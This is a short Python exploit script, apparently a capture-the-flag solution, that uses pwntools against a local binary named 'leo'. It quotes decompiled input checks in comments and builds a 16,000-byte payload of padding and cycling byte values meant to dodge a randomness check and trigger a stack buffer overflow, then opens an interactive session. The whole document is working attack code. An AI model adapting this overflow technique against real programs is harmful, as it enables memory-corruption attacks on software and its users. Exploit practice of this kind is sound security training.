from pwn import *
io = process('./leo')
context.log_level = 'debug'
pause()

#  if ( none_chr > 4 || 10 * average <= max_count )// check if random
#  {
#    if ( min_chr > 0x7F || max_chr <= 8 )
#    {
#     else if ( min_count || 2 * average >= max_count ) 

# we just need to make to input unrecognizeable and we will step into the stack overflow
# function
inpt = ''
inpt += 'a' * 0x26c
length = len(inpt)
i = 0

while length < 16000:
    i += 1
    if (i & 0xff) == ord('a'):
        continue
    inpt += chr(i & 0xff)
    length += 1

io.sendline(inpt)

io.interactive()
